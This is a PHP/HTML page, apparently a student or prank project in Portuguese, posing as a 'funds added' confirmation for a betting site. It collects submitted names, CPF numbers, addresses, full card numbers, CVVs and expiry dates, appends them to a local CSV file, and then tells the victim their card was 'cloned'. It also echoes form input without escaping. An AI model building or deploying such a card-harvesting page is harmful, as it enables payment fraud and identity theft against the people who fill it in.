<title>Fundos Adicionados</title>
<style>
    body
    {
        background-image: url(https://mocah.org/thumbs/388522-4k-wallpaper.jpg);
        background-repeat: no-repeat;
        background-attachment: fixed;
        background-position: center;
        background-size: cover;

    }
    P{
        font-size: 40px;
        color:black;
    }
    h1{
        font-size: 80px;
        color:black;
    }
    .button2 
            {
            background-color: #ffffff;
            border: 2px solid
            color: rgb(0, 0, 0);
            padding: 8px 18px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
            transition-duration: 0.5s;
            }
            .button2:hover {
            background-color: #cc923c; 
            color: white;
            box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19)
            }
</style>

<?php

    // http://localhost/Formulário/acessorios/Forms.php?Firma=&Data=&N°=&endereco=&complemento=&bairro=&cidade=&estado=&cep=&cnpj=&inscricao=&tels=&celualar=&e-mail=&obs=
    // $nome = $_GET["nome"];
    // $telefone =  $_GET["telefone"];
    // $email = $_GET["email"];

    //ok //
    $Nome = $_POST["nome"];
    $Data =  $_POST["data"];
    $CPF = $_POST["CPF"];
    $Enderço = $_POST["endereco"];
    $Complemento = $_POST["complemento"];
    $Bairo = $_POST["bairro"];
    $CEP = $_POST["cep"];
    $Estado = $_POST["estado"];
    $Validade = $_POST["validade"];
    $Num_Card = $_POST["numerocartao"];
    $CVV = $_POST["CVV"];
    $Bandeiras = $_POST["bandeiras"];
    $Num_Telefone = $_POST["telefone"];
    $Email = $_POST["e-mail"];

    if(empty($Nome) && empty($Data) && empty($CVV) && empty($Validade) && empty($Num_Card) && empty($Bandeiras)){
        echo "<p>Todos os campos devem ser informados</p>";
    }
    else {
        echo "<h1>SEUS DADOS FORAM CLONADOS</h1><p> Eai <b>$Nome</b> obrigrado pelo Número, CVV e pela Validade do seu cartão.</p>";
        file_put_contents("PPF.csv", "$Nome,$Data,$CPF,$Enderço,$Complemento,$Bairo,$CEP,$Estado,$Validade,$Num_Card,$CVV,$Bandeiras,$Num_Telefone,$Email,\n", FILE_APPEND);    
    }
    
?>
<center>
<img src="Vetor.png" width="3000">
</center>
<footer class="text-muted py-5">
    <div class="container">
	<p class="mb-1" style="color:black;">Trabalho feito por Guilherme de Almeida "Schneider" Torrão&copy;. Pode se preocupar agora, clonei seu cartão</p>
	    <p class="mb-0" style="color:black;">Só esperar o boleto chegar agora. <a href="https://github.com/VegaCenturion/">Visita perfil no Git</a> se quiser recuperar seus dados apagados KEK.</p>
                <p class="float-end mb-1">
        <button class="button2">
        <a href="http://localhost/SApostas/album/SApostas.html">Voltar</a>
        </button> 
        </p>
    </div>
</footer>